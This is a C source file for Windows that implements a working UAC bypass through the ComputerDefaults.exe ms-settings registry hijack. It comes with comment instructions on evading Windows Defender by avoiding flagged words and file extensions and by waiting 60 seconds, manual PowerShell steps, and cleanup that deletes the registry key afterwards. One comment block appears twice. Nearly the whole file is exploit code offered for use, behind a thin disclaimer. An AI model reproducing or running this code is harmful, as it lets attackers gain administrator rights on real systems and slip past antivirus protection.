#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tchar.h>

// ######################################################################################################################################################################################################
// ##################################################################################### Exploit by raphaelthief ########################################################################################
// ######################################################################################################################################################################################################

// ######################################################################################################################################################################################################
// Disclaimer :
// I am obviously not responsible for what you might do with this technique, and I encourage you to not misuse this code, of course
// However, many exploits sold on various forums use the ComputerDefaults vulnerability. Perhaps one day we will get a fix for these vulnerabilities, but for now, it seems like it’s just a temporary patch ?
// But of course, I don't have all the details regarding the proposed fix
// ######################################################################################################################################################################################################

// ######################################################################################################################################################################################################
// To bypass Windows Defender on the UAC via a registry key, you need to ensure several points :
// - The path must not contain any suspicious words or extensions related to the system
// --> 'ComputerDefaults', 'bypass' are suspicious words flagged by Windows Defender, leading to an immediate detection
// --> '.py', 'cmd', '.vbs', '.ps1', '.bat' are system extensions that are part of the blacklist implemented by Microsoft for this vulnerability
// - The launch of the exploit must be accompanied by a delay of at least 60 seconds. Below that, Defender will consider this behavior a threat
// ######################################################################################################################################################################################################

// ######################################################################################################################################################################################################
// To bypass Windows Defender on the UAC via a registry key, you need to ensure several points :
// - The path must not contain any suspicious words or extensions related to the system
// --> 'ComputerDefaults', 'bypass' are suspicious words flagged by Windows Defender, leading to an immediate detection
// --> '.py', 'cmd', '.vbs', '.ps1', '.bat' are system extensions that are part of the blacklist implemented by Microsoft for this vulnerability
// - The launch of the exploit must be accompanied by a delay of at least 60 seconds. Below that, Defender will consider this behavior a threat
// ######################################################################################################################################################################################################

// ######################################################################################################################################################################################################
// You can manually reproduce this process :
// - Create an executable according to your needs (launch an application, run a cmd, etc...)
// - Enter the following commands one by one :
// --> New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force;
// --> New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value '' -Force;
// --> Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value 'FILE_TO_TRIGGER' -Force;
// - Replace FILE_TO_TRIGGER with your executable
// - Ensure the path and executable name are 'non-suspicious' as mentioned earlier
// - Wait at least 60 seconds
// - Open a cmd without administrative rights and then enter the command 'ComputerDefaults'
// - Your executable should launch with administrative rights
// - Delete the exploit with the following command :
// --> Remove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force
// ######################################################################################################################################################################################################



// Checks if the registry key exists. If it exists, the program will launch a cmd window with admin rights
int check_registry_key_exists(const char *key_path) {
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, key_path, 0, KEY_READ, &hKey);
    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return 1; // The key exists
    }
    return 0; // The key does not exist
}

// Creates a registry entry for UAC bypass via the ComputerDefaults exploit
void set_bypass() {
    printf("[+] Creating registry entry...\n");

    char current_file_path[MAX_PATH];
    // Path of the current executable. This entry allows launching a cmd window with admin rights by relaunching the current program with elevated privileges
	GetModuleFileNameA(NULL, current_file_path, MAX_PATH); // The path must not contain "sensitive" words like 'ComputerDefaults', 'bypass', 'cmd', '.py', '.vbs', '.bat', etc. Such words are flagged automatically
	
	
    char reg_add[1024];
    snprintf(reg_add, sizeof(reg_add),
             "New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force;"
             "New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value '' -Force;"
             "Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value '%s' -Force;",
             current_file_path);

    char command[2048];
    snprintf(command, sizeof(command), "powershell -Command \"%s\"", reg_add);
    int result = system(command);

    if (result != 0) {
        printf("[-] Error while creating registry entry.\n");
    } else {
        printf("[+] Registry entry created successfully.\n");
    }

    printf("[+] Bypassing Windows Defender...\n");
    printf("[+] Sleeping 60 seconds...\n");
    Sleep(60000); // Wait for 60 seconds. This delay helps bypass Windows Defender

    printf("[+] Launching admin CMD...\n");
    if ((int)ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\ComputerDefaults.exe", NULL, NULL, SW_HIDE) <= 32) { // Launch the ComputerDefaults.exe to trigger the UAC prompt
        printf("[-] Error while running ComputerDefaults.\n");
    }

    Sleep(10000); // Wait for 10 seconds. Depending on system performance, this delay gives enough time to relaunch the program and trigger an admin cmd window
    printf("[+] Clearing registry entry...\n");

    char reg_kill[1024] = "Remove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force"; // Deletes the registry entries created for the exploit
    snprintf(command, sizeof(command), "powershell -Command \"%s\"", reg_kill);
    result = system(command);

    if (result != 0) {
        printf("[-] Error while clearing registry entry.\n");
    } else {
        printf("[+] Registry entry cleared successfully.\n");
    }

    printf("[+] Done.\n");
}

// Launches the UAC bypass
void uac_bypass() {
    printf("[+] Launching cmd with admin rights ...\n");
    system("start cmd");
    exit(0); // Close the exploit
}

int main() {
    const char *key_path = "Software\\Classes\\ms-settings\\Shell\\Open\\command"; // Path of the registry key to be created for exploiting the ComputerDefaults vulnerability

    if (check_registry_key_exists(key_path)) { // Check if the registry key exists
        uac_bypass(); // If it exists, launch a cmd window because the current program has already been relaunched with admin rights
    } else {
        set_bypass(); // The registry key does not exist, so create it with the current program's path to relaunch it with admin rights
    }

    return 0;
}
